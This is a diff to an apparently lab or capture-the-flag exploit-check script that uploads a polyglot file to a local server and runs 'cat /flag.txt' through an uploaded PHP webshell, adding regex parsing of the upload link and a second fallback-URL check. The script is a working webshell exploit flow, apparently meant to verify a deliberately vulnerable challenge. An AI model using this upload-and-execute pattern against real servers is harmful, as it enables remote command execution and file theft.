@@ -6,6 +6,7 @@ Author: Tanish Shah (@tanishshahh)
 """
 
 import sys
+import re
 import requests
 
 TARGET_BASE = "http://127.0.0.1:5003"
@@ -51,16 +52,31 @@ def test_polyglot_exploit(base_url):
 
     print("[+] Polyglot file accepted by server.")
 
-    # Execute /readflag via webshell
+    # Execute /readflag via webshell (using dynamic isolated link or fallback)
+    link_match = re.search(r'href="(/uploads/[^"]+)"', resp.text)
+    if link_match:
+        exec_url = f"{base_url}{link_match.group(1)}?cmd=cat%20/flag.txt"
+        print(f"[*] Isolated webshell URL detected: {link_match.group(1)}")
+    else:
+        exec_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"
+
     print("[*] Executing command via uploaded webshell (?cmd=cat /flag.txt)...")
-    exec_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"
     exec_resp = requests.get(exec_url, timeout=5)
 
     if EXPECTED_FLAG in exec_resp.text:
-        print(f"[+] Flag extracted successfully: {EXPECTED_FLAG}")
-        return True
+        print(f"[+] Flag extracted successfully via isolated link: {EXPECTED_FLAG}")
     else:
         print(f"[-] Command output did not contain expected flag: {exec_resp.text}")
+        return False
+
+    # Also verify fallback un-prefixed URL works for legacy scripts
+    fallback_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"
+    fb_resp = requests.get(fallback_url, timeout=5)
+    if EXPECTED_FLAG in fb_resp.text:
+        print(f"[+] Legacy fallback URL verified successfully.")
+        return True
+    else:
+        print(f"[-] Fallback URL did not resolve flag: {fb_resp.text}")
         return False
 
 def main():
